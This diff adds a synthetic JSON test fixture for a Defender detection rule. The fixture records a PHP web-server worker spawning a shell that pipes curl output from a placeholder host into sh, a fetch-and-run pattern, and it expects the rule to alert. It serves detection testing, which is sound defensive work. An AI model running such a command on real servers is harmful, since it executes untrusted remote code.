@@ -1,0 +1,24 @@
+{
+  "label": "malicious",
+  "variant": "cPanel LiteSpeed PHP child pipes curl to sh",
+  "synthetic": true,
+  "source": "synthetic; https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-10T13:10:00Z",
+      "DeviceId": "synthetic-device-0001",
+      "DeviceName": "web1.example.invalid",
+      "AccountName": "cpuser1",
+      "FileName": "sh",
+      "FolderPath": "/bin/sh",
+      "ProcessCommandLine": "/bin/sh -c curl -fsSL https://example.invalid/i.sh | sh",
+      "InitiatingProcessFileName": "lsphp",
+      "InitiatingProcessCommandLine": "lsphp",
+      "InitiatingProcessParentFileName": "lsphp"
+    }
+  ]
+}
